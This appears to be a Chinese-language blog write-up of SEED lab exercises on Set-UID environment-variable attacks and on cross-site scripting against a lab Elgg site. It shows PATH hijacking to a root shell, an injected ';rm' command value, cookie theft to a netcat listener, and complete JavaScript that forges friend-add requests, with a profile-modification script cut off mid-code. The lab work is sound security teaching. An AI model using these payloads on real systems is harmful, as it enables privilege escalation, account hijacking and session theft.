<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023180423426.png" alt="image-20231023180423426"></p>
<h2 id="Task-5-Environment-Variable-and-Set-UID-Programs"><a href="#Task-5-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 5: Environment Variable and Set-UID Programs"></a>Task 5: Environment Variable and Set-UID Programs</h2><h3 id="Step1-编写程序"><a href="#Step1-编写程序" class="headerlink" title="Step1 编写程序"></a>Step1 编写程序</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023181051422.png" alt="image-20231023181051422"></p>
<h2 id="Step2-2"><a href="#Step2-2" class="headerlink" title="Step2"></a>Step2</h2><p>编译程序，并且更改程序执行权限</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023181142941.png" alt="image-20231023181142941"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023181151872.png" alt="image-20231023181151872"></p>
<h3 id="Step3-2"><a href="#Step3-2" class="headerlink" title="Step3"></a>Step3</h3><p>设置三个环境变量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023181410423.png" alt="image-20231023181410423"></p>
<p>这些环境变量是设置在用户空间的，从<code>$</code>就可看出来</p>
<p>之后运行上面写好的程序</p>
<p>我们发现在父进程中设置的<strong>PATH、name环境变量都已经进入了子进程的环境变量</strong>，但是我们发现在子进程的环境变量中<strong>找不到LD_LIBRARY_PATH环境变量</strong>。</p>
<p>LD_LIBRARY_PATH用于指定查找共享库（动态链接库）时除了默认路径以外的其他路径；LD_LIBRARY_PATH可以被修改，从而加载攻击者的恶意库；为了使Set-UID程序更加安全，不受LD_LIBRARY_PATH环境变量的影响，运行时的链接器或加载器（ld.so）会忽略LD*环境变量；或许可以理解为链接器所拥有的一个保护机制：当执行程序的进程ID与拥有者的进程ID不一致时，链接器就会忽略掉LD_LIBRARY_PATH环境变量，所以在子进程的环境变量中找不到此环境变量。</p>
<h2 id="Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs"><a href="#Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 6: The PATH Environment Variable and Set-UID Programs"></a>Task 6: The PATH Environment Variable and Set-UID Programs</h2><p>先编写一个程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023182511812.png" alt="image-20231023182511812"></p>
<p>这个程序运行了ls指令，并且使用的是相对路径，我们编译运行,结果如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023182555684.png" alt="image-20231023182555684"></p>
<p>发现他确实运行了<code>ls</code>指令</p>
<p>更改为Set-UID程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023182715697.png" alt="image-20231023182715697"></p>
<p>为了关闭保护程序，我们将<code>/bin/sh</code>重链接到另外一个程序上：</p>
<p><code>sudo ln -sf /bin/zsh /bin/sh</code></p>
<h3 id="运行任意编写的代码"><a href="#运行任意编写的代码" class="headerlink" title="运行任意编写的代码"></a>运行任意编写的代码</h3><p>由于是使用的相对路径，所以我们写一个名叫ls的程序放在当前目录下，使用Set-UID程序就能执行这个恶意程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023183017767.png" alt="image-20231023183017767"></p>
<p>编译这个程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023183036390.png" alt="image-20231023183036390"></p>
<p>将<code>/bin/bash</code>的运行根目录更改为我们当前的目录</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023183226743.png" alt="image-20231023183226743"></p>
<p>再运行一次<code>task6</code>命令，发现已经成功运行了我们的恶意程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023183256825.png" alt="image-20231023183256825"></p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>因为是直接运行目录下的<code>ls</code>，所以我们将<code>/bin/bash</code>复制到当前目录下，并且命名为<code>ls</code>,则运行<code>task6</code>后就可以getshell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023183735615.png" alt="image-20231023183735615"></p>
<h2 id="Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><a href="#Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 7: The LD PRELOAD Environment Variable and Set-UID Programs"></a>Task 7: The LD PRELOAD Environment Variable and Set-UID Programs</h2><h3 id="Step1-2"><a href="#Step1-2" class="headerlink" title="Step1"></a>Step1</h3><ul>
<li>编写<code>mylib.c</code>文件</li>
<li>编译<code>mylib.c</code>文件</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023185206029.png" alt="image-20231023185206029"></p>
<ul>
<li>将<code>LD_PRELOAD</code>环境变量的值改为当前目录下编译好的<code>libmylib.so.1.0.1</code>文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_PRELOAD=./libmylib.so.1.0.1</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023185335837.png" alt="image-20231023185335837"></p>
<ul>
<li>编译<code>myprog.c</code>文件</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023185519083.png" alt="image-20231023185519083"></p>
<h3 id="Step2-3"><a href="#Step2-3" class="headerlink" title="Step2"></a>Step2</h3><p>运行<code>myprog</code>文件</p>
<ul>
<li>Make myprog a regular program, and run it as a normal user.</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023185659861.png" alt="image-20231023185659861"></p>
<p>程序运行了我们在当前目录的<code>sleep</code>文件，因为<code>sleep</code>被链接到了当前目录下的<code>sleep</code>函数</p>
<ul>
<li>Make myprog a Set-UID root program, and run it as a normal user.</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023190008227.png" alt="image-20231023190008227"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023190028107.png" alt="image-20231023190028107"></p>
<p>程序正常睡眠1s之后退出, 因为切换为另一个用户之后，动态链接器会忽略LD_PRELOAD环境变量</p>
<ul>
<li>Make myprog a Set-UID root program, export the LD PRELOAD environment variable again in the root account and run it.</li>
</ul>
<p>切换为root权限</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023190408036.png" alt="image-20231023190408036"></p>
<p>添加环境变量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023190505303.png" alt="image-20231023190505303"></p>
<p>运行程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023190520507.png" alt="image-20231023190520507"></p>
<p>发现运行了我们写的程序,因为调用和执行的两个用户是同一个所以可以使用LD_PRELOAD环境变量</p>
<ul>
<li>Make myprog a Set-UID user1 program (i.e., the owner is user1, which is another user account), export the LD PRELOAD environment variable again in a different user’s account (not-root user) and run it.</li>
</ul>
<p>将文件所有者更改为user1</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023191020282.png" alt="image-20231023191020282"></p>
<p>运行程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023191030371.png" alt="image-20231023191030371"></p>
<p>也是正常的运行了<code>sleep</code>函数，</p>
<h3 id="Step3-3"><a href="#Step3-3" class="headerlink" title="Step3"></a>Step3</h3><ul>
<li>真实用户ID与拥有者用户ID一致，子进程会继承seed用户下的LD*环境变量，并加入共享库，执行设置的sleep函数</li>
<li>真实用户ID与拥有者用户ID不一致，子进程不会继承seed用户下的LD*环境变量，执行原有的sleep函数</li>
<li>真实用户ID与拥有者用户ID一致，子进程会继承seed用户下的LD*环境变量，并加入共享库，执行设置的sleep函数</li>
<li>还是因为运行的环境id和拥有者id不一致，导致LD_PRELOAD环境变量被忽略</li>
</ul>
<h2 id="Task-8-Invoking-External-Programs-Using-system-versus-execve"><a href="#Task-8-Invoking-External-Programs-Using-system-versus-execve" class="headerlink" title="Task 8: Invoking External Programs Using system() versus execve()"></a>Task 8: Invoking External Programs Using system() versus execve()</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1:"></a>Step 1:</h3><p>转为一个Set-UID程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023193749483.png" alt="image-20231023193749483"></p>
<p>使用root用户创建一个文件, 并且使用seed用户不能删除这个文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023194246085.png" alt="image-20231023194246085"></p>
<p>可以正常运行<code>catall</code>程序</p>
<p>我们执行命令<code>/home/super.c;rm /home/super.c </code> 发现成功删除</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023194855537.png" alt="image-20231023194855537"></p>
<h3 id="Step2-4"><a href="#Step2-4" class="headerlink" title="Step2"></a>Step2</h3><p>更改程序</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023195025466.png" alt="image-20231023195025466"></p>
<p>编译之后赋予Set-UID权限</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023195228388.png" alt="image-20231023195228388"></p>
<p>继续尝试Step1中的方法，发现并不能删除</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023195412743.png" alt="image-20231023195412743"></p>
<p>是因为system会创建一个子进程，然后子进程会调用一个新的shell程序，而且因为<code>catall</code>是一个Set-UID根程序，所以在执行时会以root权限执行删除文件的命令，可以成功删除。</p>
<p>使用execve()不可以成功删除不可写文件，因为execve会执行一个新程序，而不会调用新的shell程序，所以将我们输入的参数仅仅当成一个字符串，不会执行命令，所以不能删除不可写文件。</p>
<h2 id="Task-9-Capability-Leaking"><a href="#Task-9-Capability-Leaking" class="headerlink" title="Task 9: Capability Leaking"></a>Task 9: Capability Leaking</h2><p>给程序赋予权限</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023200029316.png" alt="image-20231023200029316"></p>
<p>使用root权限创建<code>zzz</code>文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023200334758.png" alt="image-20231023200334758"></p>
<p>运行代码，写入zzz</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023200526927.png" alt="image-20231023200526927"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231023201008669.png" alt="image-20231023201008669"></p>
<p>该程序是root有效用户，并是Set_UID程序，有权利打开&#x2F;etc&#x2F;zzz文件，在执行了setuid()撤销权限后，由于文件并没有关闭，出现了权限泄露的问题，该文件仍然具有root权限。因此能够继续执行写入hello内容</p>
<h1 id="Cross-Site-Scripting-XSS-Attack-Lab"><a href="#Cross-Site-Scripting-XSS-Attack-Lab" class="headerlink" title="Cross-Site Scripting (XSS) Attack Lab"></a>Cross-Site Scripting (XSS) Attack Lab</h1><h2 id="Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window"><a href="#Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window" class="headerlink" title="Task 1: Posting a Malicious Message to Display an Alert Window"></a>Task 1: Posting a Malicious Message to Display an Alert Window</h2><p>登录alice的账号，修改主页的信息，嵌入script脚本，保存主页信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030164333496.png" alt="image-20231030164333496"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030164352908.png" alt="image-20231030164352908"></p>
<p>由于About me中标签有<p>所以不能嵌入到about me中，可以嵌入到brief description中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030164503440.png" alt="image-20231030164503440"></p>
<p>保存之后可以看到脚本运行成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030164521871.png" alt="image-20231030164521871"></p>
<p>如果是长的script代码，就需要调用远端的javascript代码，放到我们自己的服务器上，通过使用src标签进行引用</p>
<h2 id="Task-2-Posting-a-Malicious-Message-to-Display-Cookies"><a href="#Task-2-Posting-a-Malicious-Message-to-Display-Cookies" class="headerlink" title="Task 2: Posting a Malicious Message to Display Cookies"></a>Task 2: Posting a Malicious Message to Display Cookies</h2><p>就是把Task1中的<code>alert(&quot;hello&quot;)</code>换为<code>alert(document.cookie)</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030164834301.png" alt="image-20231030164834301"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030164842214.png" alt="image-20231030164842214"></p>
<h2 id="Task-3-Stealing-Cookies-from-the-Victim’s-Machine"><a href="#Task-3-Stealing-Cookies-from-the-Victim’s-Machine" class="headerlink" title="Task 3: Stealing Cookies from the Victim’s Machine"></a>Task 3: Stealing Cookies from the Victim’s Machine</h2><p>修改javascript脚本，发送cookie到我们监听的端口。使用<code>nc -lknv 5555</code>进行监听</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030170149055.png" alt="image-20231030170149055"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030170215364.png" alt="image-20231030170215364"></p>
<p>保存之后，访问主页之后，发现请求报文被发送到远端的服务器了,但用户视角并没有提示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030170252282.png" alt="image-20231030170252282"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030170318183.png" alt="image-20231030170318183"></p>
<p>箭头所指部分就是cookie值</p>
<h2 id="Task-4-Becoming-the-Victim’s-Friend"><a href="#Task-4-Becoming-the-Victim’s-Friend" class="headerlink" title="Task 4: Becoming the Victim’s Friend"></a>Task 4: Becoming the Victim’s Friend</h2><p>可以看到在文本模式下输入一个字符，切换为HTML之后就会看到已经把他转义了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030183232002.png" alt="image-20231030183232002"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030183240835.png" alt="image-20231030183240835"></p>
<p>我们使用Samy添加alice并且抓包看看请求的url地址：<code>http://www.seed-server.com/action/friends/add?friend=56&amp;__elgg_ts=1698662057&amp;__elgg_token=q3kjjkKfgKZHR7y00qMiXQ&amp;__elgg_ts=1698662057&amp;__elgg_token=q3kjjkKfgKZHR7y00qMiXQ</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030183545143.png" alt="image-20231030183545143"></p>
<p>所以恶意代码完整为</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span><br><span class="line">    <span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> sendurl=<span class="string">&quot;/action/friends/add?friend=59&quot;</span> + ts + token + ts + token;</span><br><span class="line">    <span class="keyword">if</span> (elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span> != <span class="number">47</span>) &#123;</span><br><span class="line">	    <span class="title class_">Ajax</span>=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">	    <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,sendurl,<span class="literal">true</span>);</span><br><span class="line">	    <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Host&quot;</span>,<span class="string">&quot;www.xsslabelgg.com&quot;</span>);</span><br><span class="line">	    <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;X-Requested-With&quot;</span>,<span class="string">&quot;XMLHttpRequest&quot;</span>);</span><br><span class="line">	    <span class="title class_">Ajax</span>.<span class="title function_">send</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>把代码插入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030184230222.png" alt="image-20231030184230222"></p>
<p>使用alice访问samy的主页</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030183952600.png" alt="image-20231030183952600"></p>
<p>发现alice已经添加为好友了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231030184331581.png" alt="image-20231030184331581"></p>
<p>Q1: 这两行是为了绕过Elgg服务器的验证</p>
<p>Q2：不行，代码被转义成文本内容，不能当作脚本执行</p>
<h2 id="Task-5-Modifying-the-Victim’s-Profile"><a href="#Task-5-Modifying-the-Victim’s-Profile" class="headerlink" title="Task 5: Modifying the Victim’s Profile"></a>Task 5: Modifying the Victim’s Profile</h2><p>利用JS实现ajax代码，插入到主页中</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> userName=<span class="string">&quot;&amp;name=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>;</span><br><span 